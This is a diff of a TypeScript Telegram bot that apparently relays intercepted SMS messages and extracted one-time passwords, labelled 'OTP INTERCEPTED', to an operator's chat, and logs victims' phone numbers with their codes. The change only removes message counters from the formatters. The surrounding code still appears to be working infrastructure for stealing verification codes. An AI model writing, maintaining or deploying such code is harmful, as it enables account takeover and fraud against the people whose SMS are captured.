@@ -120,7 +120,7 @@ function formatTime(ts: string): string {
 }
 
 // ─── Message Formatters ───────────────────────────────────────────────────────
-function formatOtpMessage(sms: SmsMessage, total: string, otpTotal: number): string {
+function formatOtpMessage(sms: SmsMessage): string {
   const otp = extractOtp(sms.body)!;
   return (
     `⚡️ <b>OTP INTERCEPTED</b> ⚡️\n` +
@@ -135,13 +135,11 @@ function formatOtpMessage(sms: SmsMessage, total: string, otpTotal: number): str
     `<i>${escapeHtml(sms.body)}</i>\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━\n` +
     `🔑  <b>OTP CODE  →  </b><code>${escapeHtml(otp)}</code>\n` +
-    `        <i>⬆️ Tap code to copy instantly</i>\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-    `📊 SMS: <b>${escapeHtml(total)}</b>   🔐 OTPs: <b>${otpTotal}</b>`
+    `        <i>⬆️ Tap code to copy instantly</i>`
   );
 }
 
-function formatSmsMessage(sms: SmsMessage, total: string): string {
+function formatSmsMessage(sms: SmsMessage): string {
   return (
     `📨 <b>NEW MESSAGE</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -152,9 +150,7 @@ function formatSmsMessage(sms: SmsMessage, total: string): string {
     `💳  <b>Plan</b>    ${escapeHtml(sms.plan)}\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━\n` +
     `💬  <b>Message</b>\n` +
-    `<i>${escapeHtml(sms.body)}</i>\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
-    `📊 Total SMS: <b>${escapeHtml(total)}</b>`
+    `<i>${escapeHtml(sms.body)}</i>`
   );
 }
 
@@ -531,13 +527,13 @@ export function startTelegramBot(): void {
         try {
           if (hasOtp && otp) {
             otpCount++;
-            await bot.sendMessage(chatId, formatOtpMessage(sms, total, otpCount), {
+            await bot.sendMessage(chatId, formatOtpMessage(sms), {
               parse_mode: "HTML",
               reply_markup: buildOtpKeyboard(sms, storeId),
             });
             logger.info({ phone: sms.phone, otp }, "OTP SMS sent to Telegram");
           } else {
-            await bot.sendMessage(chatId, formatSmsMessage(sms, total), {
+            await bot.sendMessage(chatId, formatSmsMessage(sms), {
               parse_mode: "HTML",
               reply_markup: buildSmsKeyboard(sms, storeId),
             });
@@ -546,7 +542,7 @@ export function startTelegramBot(): void {
         } catch (sendErr) {
           logger.error({ sendErr }, "Failed to send with keyboard, retrying without");
           try {
-            const text = hasOtp && otp ? formatOtpMessage(sms, total, otpCount) : formatSmsMessage(sms, total);
+            const text = hasOtp && otp ? formatOtpMessage(sms) : formatSmsMessage(sms);
             await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
           } catch (fallbackErr) {
             logger.error({ fallbackErr }, "Fallback send also failed");
